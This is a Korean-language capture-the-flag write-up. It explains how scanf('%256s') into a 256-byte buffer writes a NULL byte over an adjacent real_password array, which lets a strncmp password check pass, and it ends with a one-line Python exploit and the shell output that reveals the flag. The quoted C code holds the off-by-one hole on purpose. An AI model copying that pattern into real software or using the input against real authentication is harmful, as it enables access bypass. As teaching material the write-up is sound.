#### 1. 문제 분석

```C
...
char user_password[256];
char real_password[256];
...
scanf("%256s", user_password);
...
if(!strncmp(user_password, real_password, strlen(real_password))){
        puts("Great! Here is flag :)");
        system("/bin/cat flag");
}
else
        puts("Wrong :(");
```

이번 문제는 단순히 비밀번호를 체크하고 비밀번호가 맞으면 flag를 주는군요.

그런데 문제는 password 파일의 내용물은 모른단 말이죠... 음...

문제의 코드를 자세히 보면 비밀번호를 256바이트 크기의 배열에 입력받고 scanf를 통해 256 글자를 입력 받습니다.

그런데 좀 이상하지 않나요? 분명 문자열은 NULL 값으로 끝나야하는데 256글자를 받으면 NULL값은 없겠군요?...

라고 생각하기 쉬운데 scanf 에서 %s 로 입력받을 경우 입력값의 마지막에 자동으로 NULL값이 붙게됩니다.

자동으로 붙은 이 NULL값은 1바이트 오버플로우 된 것이고, 이 오버플로우된 널값은 바로 근접해있는 real_password 배열을 덮어쓰게됩니다.

따라서 256글자 이상을 비밀번호를 입력하는 경우에는 real_password[0] 값이 NULL값이 되는것이죠!

```[ AAAA...AAA(256글자) ][ \x00... ]```

#### 2. 문제 풀이

풀이 자체는 매우 심플합니다. 256글자 이상 아무글자나 비밀번호로 넣으면 되는것이죠.

256글자 이상이 들어오면 real_password[0]의 값이 NULL이 되기때문에 strlen(real_password)의 값은 0이 되게 되고 따라서 strncmp에서는 비교할 문자열의 길이가 0이므로 그냥 패스되게 됩니다.


#### 3. Exploit Code
```Python
# exploit.py
print "A"*256
```

```Shell
$ (python exploit.py; cat) | ./auth
password: do not bruteforce...
Great! Here is flag :)
0ff-by-0n3 0v3rflOw can be d4ngerous!
```

